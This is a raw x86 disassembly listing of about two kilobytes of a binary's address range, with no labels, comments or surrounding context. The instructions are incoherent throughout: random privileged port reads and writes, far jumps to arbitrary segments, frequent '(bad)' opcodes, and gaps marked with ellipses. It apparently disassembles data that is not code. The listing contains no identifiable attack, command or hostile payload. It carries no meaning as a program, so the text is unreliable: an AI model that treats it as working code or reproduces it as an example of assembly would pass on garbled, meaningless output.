  42c9ab:	addr16 dec esp
  42c9ad:	fdiv   st,st(6)
  42c9af:	test   al,dh
  42c9b1:	std    
  42c9b2:	out    dx,al
  42c9b3:	or     ah,al
  42c9b5:	add    ecx,DWORD PTR [eax+0x2f]
  42c9b8:	pop    ebx
  42c9b9:	hlt    
  42c9ba:	cwde   
  42c9bb:	jg     0x42ca0b
  42c9bd:	iret   
  42c9be:	sub    eax,0x81db8439
  42c9c3:	pop    esi
  42c9c4:	jl     0x42c9a9
  42c9c6:	and    bl,BYTE PTR [edx]
  42c9c8:	femms  
  42c9ca:	xchg   eax,esi
  42c9cc:	adc    DWORD PTR [ecx+eiz*2-0x137b5c1a],0xce0dd662
  42c9d7:	std    
  42c9d8:	dec    edi
  42c9d9:	push   edi
  42c9da:	pop    ss
  42c9db:	jp     0x42c9a5
  42c9dd:	or     al,0x6b
  42c9df:	fwait
  42c9e0:	or     ch,BYTE PTR [ecx-0x2b]
  42c9e3:	scas   eax,DWORD PTR es:[edi]
  42c9e4:	sub    BYTE PTR [ebp-0x47c91a39],dh
  42c9ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9eb:	stos   DWORD PTR es:[edi],eax
  42c9ec:	cli    
  42c9ed:	cmp    eax,0xff2d100e
  42c9f2:	in     eax,0x76
  42c9f4:	pop    ebp
  42c9f5:	xor    bl,cl
  42c9f7:	clc    
  42c9f8:	data16 xor BYTE PTR [eax-0x52],0xfd
  42c9fd:	jno    0x42c9a9
  42c9ff:	mov    al,ds:0x1dfb4d99
  42ca04:	in     al,0xd1
  42ca06:	stc    
  42ca07:	in     eax,dx
  42ca08:	mov    ah,0x99
  42ca0a:	lea    edi,fs:[ebx+0x2c6876f0]
  42ca11:	sub    al,al
  42ca13:	out    dx,al
  42ca14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca16:	loope  0x42ca3e
  42ca18:	sub    dl,ch
  42ca1a:	pop    ebp
  42ca1b:	repz test DWORD PTR [esi],edi
  42ca1e:	popa   
  42ca1f:	add    DWORD PTR [ebp-0x4d34d0bc],esi
  42ca25:	add    DWORD PTR [edi],ecx
  42ca27:	stos   DWORD PTR es:[edi],eax
  42ca28:	vmaxpd ymm6,ymm2,YMMWORD PTR [eax-0x68412d77]
  42ca30:	and    esi,DWORD PTR [ecx+0x68]
  42ca33:	mov    ah,0x25
  42ca35:	cmp    eax,esi
  42ca37:	dec    ebx
  42ca38:	pushf  
  42ca39:	mov    dl,0x10
  42ca3b:	addr16 cld 
  42ca3d:	mov    ds:0x688c2fa3,al
  42ca42:	jg     0x42ca57
  42ca44:	into   
  42ca45:	sub    bl,BYTE PTR [eax]
  42ca47:	add    eax,0x1cb7f296
  42ca4c:	mov    WORD PTR [edi],ds
  42ca4e:	mov    cl,0x63
  42ca50:	or     eax,0x55ad6ce
  42ca55:	or     eax,0x17186688
  42ca5a:	loop   0x42ca8c
  42ca5c:	pop    es
  42ca5d:	test   DWORD PTR [edi-0x2e9467cb],eax
  42ca63:	das    
  42ca64:	int3   
  42ca65:	adc    eax,DWORD PTR [ebx]
  42ca67:	sub    eax,0x1553c8c
  42ca6c:	pop    edx
  42ca6d:	sbb    ah,bl
  42ca6f:	and    DWORD PTR [edi-0x20],eax
  42ca72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca73:	call   0xcd46c4ec
  42ca78:	retf   0x6046
  42ca7b:	ror    DWORD PTR [esi],0x94
  42ca7e:	add    dh,BYTE PTR [edi-0x14395535]
  42ca84:	and    ch,BYTE PTR [eax+0x126adc35]
  42ca8a:	div    ebp
  42ca8c:	push   cs
  42ca8d:	pop    esp
  42ca8e:	jb     0x42cace
	...
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0x2b6f9140]
  42cb02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb03:	addr16 cld 
  42cb05:	fld    QWORD PTR [ecx]
  42cb07:	add    BYTE PTR [ecx+eax*1],al
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	test   BYTE PTR [ebp-0x80],bh
  42cb0f:	or     ebx,DWORD PTR [ecx-0x7a865217]
  42cb15:	dec    edx
  42cb16:	and    dl,dh
  42cb18:	and    eax,0x75882277
  42cb1d:	mov    edx,0xe9cbe398
  42cb22:	inc    esp
  42cb23:	dec    esp
  42cb24:	test   DWORD PTR [esp+edx*2+0x54cf8bf2],esi
  42cb2b:	and    ebx,DWORD PTR [ebx-0x2250ef08]
  42cb31:	mov    ebx,0x2fb961b3
  42cb36:	fs iret 
  42cb38:	adc    eax,0xb0286a19
  42cb3d:	out    dx,al
  42cb3e:	mov    eax,edi
  42cb40:	popa   
  42cb41:	jl     0x42cb3b
  42cb43:	rol    BYTE PTR [esi],cl
  42cb45:	out    dx,al
  42cb46:	inc    BYTE PTR [edi-0x1782acc6]
  42cb4c:	lods   al,BYTE PTR ds:[esi]
  42cb4d:	int3   
  42cb4e:	loop   0x42cb29
  42cb50:	or     dl,BYTE PTR [esi-0x66]
  42cb53:	push   0xf11951e9
  42cb58:	push   ebp
  42cb59:	push   DWORD PTR [edi+ecx*1-0x11]
  42cb5d:	stos   DWORD PTR es:[edi],eax
  42cb5e:	xchg   edx,eax
  42cb5f:	sbb    eax,0x32e17fa3
  42cb64:	cmp    ecx,ebp
  42cb66:	lods   eax,DWORD PTR ds:[esi]
  42cb67:	sbb    eax,0xfc60379a
  42cb6c:	sub    al,BYTE PTR [ebp+0x384e3c5e]
  42cb72:	xchg   esp,eax
  42cb73:	fwait
  42cb74:	mov    esi,0xa133723e
  42cb79:	aas    
  42cb7a:	ret    
  42cb7b:	pusha  
  42cb7c:	pop    edi
  42cb7d:	and    eax,0x92df4ba2
  42cb82:	cmp    DWORD PTR [ebp-0x780b24e9],ebx
  42cb88:	sub    al,0x3
  42cb8a:	(bad)  
  42cb8b:	enter  0x777a,0xfa
  42cb8f:	int    0x56
  42cb91:	test   BYTE PTR [ecx+0x3f3a0bfe],dh
  42cb97:	fdiv   QWORD PTR [ecx-0x3f]
  42cb9a:	sub    edx,DWORD PTR ds:0xc5b34035
  42cba0:	cmp    ah,BYTE PTR [eax+0x78]
  42cba3:	add    ebx,esi
  42cba5:	imul   esp,edx,0x4
  42cba8:	fistp  WORD PTR [eax+0x62]
  42cbab:	sbb    DWORD PTR ds:[edx-0x73697f99],esp
  42cbb2:	ror    bh,0x20
  42cbb5:	and    eax,0x531c7fe5
  42cbba:	int3   
  42cbbb:	mov    esp,0xcc9514b3
  42cbc0:	lods   al,BYTE PTR ds:[esi]
  42cbc1:	sahf   
  42cbc2:	adc    eax,0xede6a78e
  42cbc7:	mov    ebx,0x11b43087
  42cbcc:	lds    esp,FWORD PTR [edx]
  42cbce:	lds    edi,FWORD PTR [eax-0x6a]
  42cbd1:	jmp    0x23eb:0xa5cf364d
  42cbd8:	(bad)  
  42cbd9:	ret    
  42cbda:	fbstp  TBYTE PTR [ebp-0x8c1ea19]
  42cbe0:	stos   DWORD PTR es:[edi],eax
  42cbe1:	lahf   
  42cbe2:	in     al,dx
  42cbe3:	loop   0x42cbdc
  42cbe5:	(bad)  
  42cbe6:	sbb    al,0xfc
  42cbe8:	fsubr  QWORD PTR [ecx]
  42cbea:	mov    eax,0x4b5b5467
  42cbef:	sub    BYTE PTR [esi+0x1dcfb3d2],dh
  42cbf5:	pop    edx
  42cbf6:	imul   DWORD PTR [eax-0x1ae25b5]
  42cbfc:	jne    0x42cc7c
  42cbfe:	(bad)  
  42cbff:	int3   
  42cc00:	out    dx,eax
  42cc01:	into   
  42cc02:	pop    eax
  42cc03:	mov    dh,0xb1
  42cc05:	pop    ebp
  42cc06:	sub    edx,DWORD PTR [edi]
  42cc08:	test   al,0xb5
  42cc0a:	pop    edi
  42cc0b:	dec    eax
  42cc0c:	jle    0x439dc5
	...
  42cc72:	add    BYTE PTR [eax],al
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x96b7df2b
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	sub    ebp,edx
  42cc8e:	add    al,0x5a
  42cc90:	or     BYTE PTR [eax],bl
  42cc92:	fwait
  42cc93:	out    0x9b,al
  42cc95:	popf   
  42cc96:	shl    esp,cl
  42cc98:	iret   
  42cc99:	push   cs
  42cc9a:	and    DWORD PTR [eax],edx
  42cc9c:	xor    bh,bl
  42cc9e:	inc    edx
  42cc9f:	adc    al,0x38
  42cca1:	repnz xchg ah,bl
  42cca4:	lds    ebp,FWORD PTR [ecx]
  42cca6:	outs   dx,DWORD PTR ds:[esi]
  42cca7:	mov    ch,BYTE PTR [eax-0x10]
  42ccaa:	stc    
  42ccab:	test   BYTE PTR [esi-0x50],al
  42ccae:	fst    DWORD PTR [eax-0xcb0afb2]
  42ccb4:	(bad)  
  42ccb5:	xchg   esi,eax
  42ccb6:	push   0x2891503
  42ccbb:	jle    0x42cd18
  42ccbd:	mov    esi,0x7ac4bfd8
  42ccc2:	aaa    
  42ccc3:	(bad)  
  42ccc4:	xor    edi,DWORD PTR [edx-0xb79c01f]
  42ccca:	xchg   ecx,eax
  42cccb:	add    dl,bl
  42cccd:	sub    eax,0xa7b64702
  42ccd2:	mov    ?,WORD PTR [esi+0x50]
  42ccd5:	jo     0x42cc8d
  42ccd7:	icebp  
  42ccd8:	leave  
  42ccd9:	aaa    
  42ccda:	jecxz  0x42ccd8
  42ccdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ccdd:	xor    eax,0x2231f54
  42cce2:	repnz or eax,0x9560cff
  42cce8:	xor    eax,0xdf0bba04
  42cced:	ds and cl,cl
  42ccf0:	or     BYTE PTR [eax-0x65247256],0x34
  42ccf7:	repnz push ebp
  42ccf9:	mov    al,ds:0x1babca9
  42ccfe:	jge    0x42ccfe
  42cd00:	inc    eax
  42cd01:	jg     0x42cd64
  42cd03:	pop    eax
  42cd04:	pop    eax
  42cd05:	(bad)  
  42cd06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cd07:	dec    eax
  42cd08:	add    edx,DWORD PTR [ebp+0x41]
  42cd0b:	imul   esp,DWORD PTR [esi+eiz*8],0x1a3fd252
  42cd12:	pop    edx
  42cd13:	push   ecx
  42cd14:	sbb    DWORD PTR [ebp+0x76656fa9],0xeb31c462
  42cd1e:	fs pop es
  42cd20:	inc    esp
  42cd21:	sahf   
  42cd22:	jg     0x42ccb3
  42cd24:	and    al,0x69
  42cd26:	cmc    
  42cd27:	jmp    0x173e2332
  42cd2c:	pusha  
  42cd2d:	fnstenv [esp+eax*8]
  42cd30:	cli    
  42cd31:	(bad)  
  42cd33:	ret    0xd602
  42cd36:	push   esi
  42cd37:	out    dx,al
  42cd38:	sbb    al,0x86
  42cd3a:	imul   esp,DWORD PTR [edi+eiz*1+0x74],0xe753e0c8
  42cd42:	lock jp 0x42cccc
  42cd45:	rol    DWORD PTR es:[esi+0x10999206],cl
  42cd4c:	gs ret 
  42cd4e:	ss stos DWORD PTR es:[edi],eax
  42cd50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd51:	stos   BYTE PTR es:[edi],al
  42cd52:	wrmsr  
  42cd54:	fldln2 
  42cd56:	inc    ebx
  42cd57:	fisub  DWORD PTR [esi+0x1d045d95]
  42cd5d:	cmp    ebx,ebp
  42cd5f:	mov    esi,0xebc603a8
  42cd64:	stos   DWORD PTR es:[edi],eax
  42cd65:	cmp    ch,BYTE PTR [ebx-0x73]
  42cd68:	aam    0xc0
  42cd6a:	shl    DWORD PTR [esi+0x32c1ecba],0x28
  42cd71:	ret    
  42cd72:	pop    ecx
  42cd73:	push   ds
  42cd74:	or     al,0xe6
  42cd76:	pop    eax
  42cd77:	adc    ebx,0x78
  42cd7a:	adc    eax,0x317265af
  42cd7f:	loopne 0x42cdd8
  42cd81:	xchg   DWORD PTR [esi+0x66b52446],ebp
  42cd87:	jnp    0x42cda9
  42cd89:	retf   
  42cd8a:	xchg   ebx,eax
  42cd8b:	int3   
  42cd8c:	pusha  
  42cd8d:	push   0xffffffaf
  42cd8f:	and    BYTE PTR [eax],al
	...
  42cdf1:	add    BYTE PTR [eax],al
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xc
  42ce01:	ins    BYTE PTR es:[edi],dx
  42ce02:	cmp    dh,BYTE PTR [ecx+0x1e004]
  42ce08:	add    al,0x1
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	pop    es
  42ce0d:	out    0x85,eax
  42ce0f:	fbstp  TBYTE PTR [esi+0x1f8b059c]
  42ce15:	add    al,0xc7
  42ce17:	or     eax,DWORD PTR [esi]
  42ce19:	sub    edi,esp
  42ce1b:	sbb    al,0x36
  42ce1d:	push   esi
  42ce1e:	lds    ebp,FWORD PTR [edx+eax*4]
  42ce21:	inc    ebx
  42ce22:	xchg   edi,eax
  42ce23:	jle    0x42ce5b
  42ce25:	in     eax,dx
  42ce26:	sbb    DWORD PTR [eax-0x7485a9b1],eax
  42ce2c:	sbb    cl,bl
  42ce2e:	cmc    
  42ce2f:	push   ss
  42ce30:	jb     0x42cdbc
  42ce32:	cmp    cl,ah
  42ce34:	enter  0x4028,0xb0
  42ce38:	mov    ch,0x11
  42ce3a:	add    eax,0x3e899258
  42ce3f:	lods   eax,DWORD PTR ds:[esi]
  42ce40:	jmp    0x3874:0x397edca9
  42ce47:	xor    al,0x91
  42ce49:	icebp  
  42ce4a:	xchg   edx,eax
  42ce4b:	sbb    ch,BYTE PTR [edi]
  42ce4d:	stos   DWORD PTR es:[edi],eax
  42ce4e:	jmp    0x42ceab
  42ce50:	push   0xe0a65717
  42ce55:	out    0x7c,al
  42ce57:	add    edi,ebp
  42ce59:	jecxz  0x42ce1b
  42ce5b:	dec    edi
  42ce5c:	sahf   
  42ce5d:	sbb    ch,bl
  42ce5f:	int3   
  42ce60:	inc    ecx
  42ce61:	adc    DWORD PTR [ebx+0x4147b6b4],0xffffffc3
  42ce68:	jge    0x42ce06
  42ce6a:	mov    ecx,0x67c81c27
  42ce6f:	sar    DWORD PTR [eax+ebp*1+0xa],0xfd
  42ce74:	adc    dl,ah
  42ce76:	or     ecx,edx
  42ce78:	xchg   ebx,eax
  42ce79:	inc    ebx
  42ce7a:	arpl   WORD PTR [eax],cx
  42ce7c:	loop   0x42ce0c
  42ce7e:	(bad)  
  42ce7f:	shl    ah,0x96
  42ce82:	leave  
  42ce83:	cmp    eax,0x97ae63aa
  42ce88:	or     dl,BYTE PTR [eax]
  42ce8a:	inc    ebp
  42ce8b:	add    BYTE PTR [esi+0x39084bbe],cl
  42ce91:	scas   al,BYTE PTR es:[edi]
  42ce92:	sub    ah,dl
  42ce94:	jmp    0x43b6:0xa627d393
  42ce9b:	jp     0x42ce70
  42ce9d:	fsubrp st(3),st
  42ce9f:	mov    esi,0xaf31bb82
  42cea4:	inc    esp
  42cea5:	mov    ebx,0x2577d8c9
  42ceaa:	mov    dl,ch
  42ceac:	ins    BYTE PTR es:[edi],dx
  42cead:	mov    eax,ds:0xc0bd7d19
  42ceb2:	adc    dh,BYTE PTR [eax+eax*8]
  42ceb5:	push   cs
  42ceb6:	hlt    
  42ceb7:	mov    ecx,0xceb1822d
  42cebc:	repnz popa 
  42cebe:	xlat   BYTE PTR ds:[ebx]
  42cebf:	xor    eax,0x3e36aaf5
  42cec4:	retf   
  42cec5:	inc    esi
  42cec6:	ds jl  0x42ce8b
  42cec9:	aam    0x6a
  42cecb:	jg     0x42cf00
  42cecd:	mov    bh,0x56
  42cecf:	sub    BYTE PTR [ebx+0x12880c13],0x6f
  42ced6:	scas   al,BYTE PTR es:[edi]
  42ced7:	sub    al,0xe8
  42ced9:	repnz sbb dh,BYTE PTR [ecx-0x6a798cf2]
  42cee0:	shr    BYTE PTR ds:0x574353e3,cl
  42cee6:	add    al,dh
  42cee8:	aas    
  42cee9:	push   es
  42ceea:	inc    esi
  42ceeb:	pop    esi
  42ceec:	int3   
  42ceed:	xor    bl,ah
  42ceef:	xchg   edi,eax
  42cef0:	xchg   edi,eax
  42cef1:	fcmovb st,st(6)
  42cef3:	in     al,0xd5
  42cef5:	fcomp  QWORD PTR [ebx-0xce02874]
  42cefb:	and    ebx,DWORD PTR [edx+0x1606e47b]
  42cf01:	push   ss
  42cf02:	dec    ecx
  42cf03:	sahf   
  42cf04:	std    
  42cf05:	mov    cl,0x58
  42cf07:	cmp    eax,0x71afc0c8
  42cf0c:	dec    esp
  42cf0d:	jnp    0x42cf0f
  42cf0f:	sbb    al,0x0
	...
  42cf71:	add    BYTE PTR [eax],al
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	(bad)  
  42cf80:	shr    DWORD PTR [esi-0x1ef79fea],cl
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    al,0x1
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	loope  0x42cff9
  42cf8e:	push   0x2b
  42cf90:	gs out 0x31,al
  42cf93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf94:	int    0x19
  42cf96:	push   0xffffffdc
  42cf98:	add    eax,0x7d6539ad
  42cf9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf9e:	test   eax,0xf20b482a
  42cfa3:	inc    ebp
  42cfa4:	jnp    0x42d00b
  42cfa6:	rol    ebx,1
  42cfa8:	outs   dx,BYTE PTR ds:[esi]
  42cfa9:	inc    BYTE PTR [ecx+0x7d]
  42cfac:	mov    eax,ds:0x12230dde
  42cfb1:	add    BYTE PTR [eax+edx*8-0x6f],ah
  42cfb5:	cmp    BYTE PTR [edx+edx*4],0xbd
  42cfb9:	fdiv   st,st(6)
  42cfbb:	sahf   
  42cfbc:	leave  
  42cfbd:	fs mov edx,0xc51d0ef6
  42cfc3:	dec    ecx
  42cfc4:	xchg   edi,eax
  42cfc5:	add    al,BYTE PTR [edx+0x15]
  42cfc8:	in     al,0xe4
  42cfca:	test   eax,0x42a21011
  42cfcf:	sbb    DWORD PTR [ecx+ecx*1+0x4da0bbbb],edx
  42cfd6:	cdq    
  42cfd7:	sub    esp,ebp
  42cfd9:	adc    al,ah
  42cfdb:	in     eax,dx
  42cfdc:	ror    BYTE PTR [ecx+0x318f068e],1
  42cfe2:	fsubp  st(4),st
  42cfe4:	adc    DWORD PTR [edi+0x4c],ebp
  42cfe7:	stos   BYTE PTR es:[edi],al
  42cfe8:	fisubr WORD PTR [ecx]
  42cfea:	sub    cl,BYTE PTR [eax]
  42cfec:	jge    0x42d014
  42cfee:	dec    ebp
  42cfef:	add    eax,0xc191f6ba
  42cff4:	cld    
  42cff5:	ret    0x17c5
  42cff8:	jne    0x42cfb2
  42cffa:	jns    0x42d069
  42cffc:	jne    0x42d044
  42cffe:	call   0x3e65:0x9cc3654
  42d005:	rcl    BYTE PTR gs:[edi+0x3b],0x3f
  42d00a:	lods   eax,DWORD PTR ds:[esi]
  42d00b:	ins    BYTE PTR es:[edi],dx
  42d00c:	leave  
  42d00d:	xchg   edx,eax
  42d00e:	pop    edx
  42d00f:	aam    0x73
  42d011:	push   cs
  42d012:	pop    ebp
  42d013:	inc    edi
  42d014:	fscale 
  42d016:	mov    ebp,0xc2a779e2
  42d01b:	dec    ebx
  42d01c:	jmp    0x42cfcc
  42d01e:	pop    ds
  42d01f:	in     eax,0xd5
  42d021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d022:	and    ah,BYTE PTR [ebx+0x37]
  42d025:	fsub   DWORD PTR [edi-0x71a69a1b]
  42d02b:	(bad)  
  42d02c:	call   0x51272efa
  42d031:	ins    DWORD PTR es:[edi],dx
  42d032:	mov    BYTE PTR [ecx-0x1d758d43],ah
  42d038:	inc    ecx
  42d039:	in     al,dx
  42d03a:	pop    edi
  42d03b:	mov    BYTE PTR [edi-0x130910c2],dh
  42d041:	into   
  42d042:	imul   edx,DWORD PTR [esi-0x7c],0x7fe6c53d
  42d049:	mov    ds:0xfcdb5e84,eax
  42d04e:	sti    
  42d04f:	sbb    dl,BYTE PTR [edx-0x1862e14b]
  42d055:	cmp    dh,BYTE PTR [ebx+0x20d79c5c]
  42d05b:	shl    BYTE PTR [edi+0x7b0a54db],1
  42d061:	dec    ecx
  42d062:	sbb    eax,0xab6d590b
  42d067:	push   ds
  42d068:	adc    BYTE PTR [eax+0x26f5f9a5],0x75
  42d06f:	sub    BYTE PTR [esi-0x7eb99723],0x59
  42d076:	leave  
  42d077:	test   eax,0xe355aba
  42d07c:	outs   dx,DWORD PTR ds:[esi]
  42d07d:	and    al,0xc4
  42d07f:	div    BYTE PTR [edi+eax*2+0x39]
  42d083:	sbb    esp,DWORD PTR [eax+0x74]
  42d086:	adc    DWORD PTR [edi+0x2d],eax
  42d089:	(bad)  
  42d08a:	jl     0x42d10a
  42d08c:	loop   0x42d066
  42d08e:	xchg   ecx,eax
  42d08f:	pop    es
	...
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [edi+0xca23b2b],cl
  42d105:	loop   0x42d108
  42d107:	add    BYTE PTR [ecx+eax*1],al
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	iret   
  42d10d:	push   es
  42d10e:	sbb    al,0x7e
  42d110:	or     eax,0xd081feab
  42d115:	push   ecx
  42d116:	push   es
  42d117:	push   ss
  42d118:	push   edi
  42d119:	(bad)  
  42d11a:	nop
  42d11b:	test   al,0x5a
  42d11d:	add    eax,0xc7063039
  42d122:	or     DWORD PTR [edi+0x7be94d63],esi
  42d128:	shr    DWORD PTR [ecx],0x49
  42d12b:	and    esi,0x49452c1d
  42d131:	int    0xba
  42d133:	imul   edi,eax,0xfffffff4
  42d136:	inc    edx
  42d137:	jg     0x42d151
  42d139:	xchg   ecx,eax
  42d13a:	pop    edx
  42d13b:	icebp  
  42d13c:	mov    al,0xbc
  42d13e:	rcl    BYTE PTR [esp+eax*1],cl
  42d141:	dec    edx
  42d142:	addr16 addr16 aam 0xf5
  42d146:	cwde   
  42d147:	mov    edx,DWORD PTR ds:0xf70376e6
  42d14d:	xor    BYTE PTR [edi*2+0x5c353f46],ah
  42d154:	cmp    al,0x18
  42d156:	mov    eax,ds:0x6eeac2ec
  42d15b:	or     DWORD PTR [ecx+0x591c7925],ebx
  42d161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d162:	pop    es
  42d163:	icebp  
  42d164:	and    eax,0x4c51949e
  42d169:	sar    BYTE PTR [eax],cl
  42d16b:	add    al,0xb3
  42d16d:	neg    dl
  42d16f:	xchg   esi,eax
  42d170:	xor    dl,BYTE PTR [esi-0x21e3d205]
  42d176:	outs   dx,DWORD PTR ds:[esi]
  42d177:	or     eax,ebp
  42d179:	cmp    DWORD PTR [edi-0x3f],0x15
  42d17d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d17e:	pop    es
  42d17f:	mov    eax,0xd547752d
  42d184:	push   0xc291effd
  42d189:	jge    0x42d176
  42d18b:	enter  0x565,0x3b
  42d18f:	inc    ebp
  42d190:	cmp    BYTE PTR [eax+0x3f616670],ah
  42d196:	mov    bh,0x4d
  42d198:	ja     0x42d17d
  42d19a:	stos   DWORD PTR es:[edi],eax
  42d19b:	das    
  42d19c:	clc    
  42d19d:	into   
  42d19e:	jge    0x42d1cc
  42d1a0:	and    bl,BYTE PTR [ebp+0x18]
  42d1a3:	daa    
  42d1a4:	popa   
  42d1a5:	pop    esi
  42d1a6:	lods   eax,DWORD PTR ds:[esi]
  42d1a7:	lods   eax,DWORD PTR ds:[esi]
  42d1a8:	pop    ds
  42d1a9:	mov    esp,DWORD PTR [eax+0x45]
  42d1ac:	sahf   
  42d1ad:	nop
  42d1ae:	mov    BYTE PTR [ecx+0x46],bl
  42d1b1:	mov    ds:0xf33eb3fa,al
  42d1b6:	sbb    eax,0x256a0240
  42d1bb:	ret    0xffad
  42d1be:	shl    BYTE PTR [ebp-0x7c778c02],cl
  42d1c4:	cld    
  42d1c5:	adc    ch,0x92
  42d1c8:	stos   BYTE PTR es:[edi],al
  42d1c9:	jecxz  0x42d24a
  42d1cb:	dec    edx
  42d1cc:	pop    ebx
  42d1cd:	adc    BYTE PTR [ebp+0x2c3c4bae],0x58
  42d1d4:	mov    cl,0x9e
  42d1d6:	shl    BYTE PTR [esi-0x34738193],1
  42d1dc:	loop   0x42d1f9
  42d1de:	push   edi
  42d1df:	aam    0xd5
  42d1e1:	loopne 0x42d1b0
  42d1e3:	pop    esp
  42d1e4:	aam    0xaf
  42d1e6:	cli    
  42d1e7:	cmp    DWORD PTR [ebx],0x5ddd4242
  42d1ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1ee:	jnp    0x42d22e
  42d1f0:	jp     0x42d1b3
  42d1f2:	scas   eax,DWORD PTR es:[edi]
  42d1f3:	fnstenv [ecx]
  42d1f5:	inc    ecx
  42d1f6:	sub    ebp,DWORD PTR [ecx-0x35]
  42d1f9:	mov    WORD PTR [ecx-0x1652c53b],es
  42d1ff:	or     ebp,DWORD PTR [eax]
  42d201:	dec    edi
  42d202:	imul   edi,DWORD PTR [ebx],0xffffff87
  42d205:	push   es
  42d206:	hlt    
  42d207:	mov    al,ds:0xb77d6cfc
  42d20c:	cmp    DWORD PTR [ebx],edi
  42d20e:	loope  0x42d1f9
	...
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d2fe
  42d281:	sahf   
  42d282:	ins    BYTE PTR es:[edi],dx
  42d283:	cmp    BYTE PTR [eax],dl
  42d285:	jecxz  0x42d288
  42d287:	add    BYTE PTR [ecx+eax*1],al
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	mov    cl,0xd
  42d28e:	fnstenv [ebp-0x54]
  42d291:	rcr    DWORD PTR [ecx+0x38c054c2],cl
  42d297:	pop    ds
  42d298:	adc    al,0xe0
  42d29a:	dec    edx
  42d29b:	imul   edx,ecx,0xc7feda1b
  42d2a1:	enter  0xce75,0xa2
  42d2a5:	cdq    
  42d2a6:	pop    ecx
  42d2a7:	dec    edi
  42d2a8:	lds    esi,FWORD PTR [ebx-0x76647d3a]
  42d2ae:	clc    
  42d2af:	mov    BYTE PTR [ebx+0x7e2d8eba],dh
  42d2b5:	sub    cl,BYTE PTR ss:[ecx-0x48]
  42d2b9:	jmp    FWORD PTR [esi]
  42d2bb:	je     0x42d2db
  42d2bd:	jge    0x42d322
  42d2bf:	jns    0x42d2d3
  42d2c1:	jns    0x42d286
  42d2c3:	popf   
  42d2c4:	imul   eax,DWORD PTR [ebx-0x78],0xd56ca9c2
  42d2cb:	xor    BYTE PTR [ebx],0x86
  42d2ce:	jno    0x42d2ee
  42d2d0:	xchg   ecx,eax
  42d2d1:	jo     0x42d2f0
  42d2d3:	fwait
  42d2d4:	add    BYTE PTR [ebp+0x5e],bh
  42d2d7:	call   0x1f54:0xc25dae8b
  42d2de:	xchg   BYTE PTR [ebx+0x4a4b65b4],ah
  42d2e4:	dec    edi
  42d2e5:	pop    esp
  42d2e6:	or     esp,DWORD PTR fs:[ebx-0xce72606]
  42d2ed:	mov    edi,0xb63f6a37
  42d2f2:	pop    ebx
  42d2f3:	aas    
  42d2f4:	sahf   
  42d2f5:	mov    ebx,esp
  42d2f7:	xchg   esp,eax
  42d2f8:	fild   QWORD PTR [eax]
  42d2fa:	xchg   edx,eax
  42d2fb:	adc    DWORD PTR [ebx],edi
  42d2fd:	out    dx,al
  42d2fe:	idiv   BYTE PTR [esp+eax*2]
  42d301:	or     eax,0xf5d3c3b
  42d306:	xor    ax,0x9073
  42d30a:	jns    0x42d2ea
  42d30c:	and    BYTE PTR [esi-0x66b9d30],0x7b
  42d313:	arpl   WORD PTR [edx],ax
  42d315:	add    eax,0x6e2a2874
  42d31a:	aad    0x54
  42d31c:	cmp    bh,BYTE PTR [ebx]
  42d31e:	mov    bh,0x9b
  42d320:	out    0xe5,al
  42d322:	shl    DWORD PTR [edx-0x3dcbed52],cl
  42d328:	mov    cl,BYTE PTR [ecx-0x6c]
  42d32b:	pushf  
  42d32c:	gs jp  0x42d358
  42d32f:	jge    0x42d33f
  42d331:	mov    eax,ds:0xf03443ba
  42d336:	cld    
  42d337:	sbb    eax,DWORD PTR [edx-0x4163f99c]
  42d33d:	jnp    0x42d307
  42d33f:	and    DWORD PTR [esi+0x6bb7e8a7],ebx
  42d345:	fs jne 0x42d375
  42d348:	retf   
  42d349:	lods   al,BYTE PTR ds:[esi]
  42d34a:	jmp    0x42d3b9
  42d34c:	ins    BYTE PTR es:[edi],dx
